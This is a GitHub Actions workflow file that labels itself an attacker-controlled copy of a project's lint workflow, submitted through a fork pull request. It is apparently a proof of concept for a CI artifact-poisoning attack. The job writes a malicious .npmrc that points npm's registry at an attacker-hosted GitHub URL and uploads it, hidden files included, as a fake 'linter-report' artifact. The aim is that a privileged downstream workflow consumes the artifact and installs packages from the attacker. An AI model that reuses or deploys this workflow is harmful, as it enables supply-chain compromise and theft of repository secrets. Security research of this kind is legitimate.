# Attacker-controlled copy of the upstream "Lint" workflow.
# A fork PR can ship this content; pull_request runs use the workflow file from the PR head.
name: ADP PR Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker-chosen artifact contents
        run: |
          mkdir -p /tmp/root
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg5/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
          echo "${{ github.event.pull_request.number }}" > /tmp/root/pr-number.txt
          printf 'linter report body chosen by attacker\n' > /tmp/root/linter-report.txt
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            /tmp/root/.npmrc
            /tmp/root/pr-number.txt
            /tmp/root/linter-report.txt
          include-hidden-files: true
          if-no-files-found: ignore

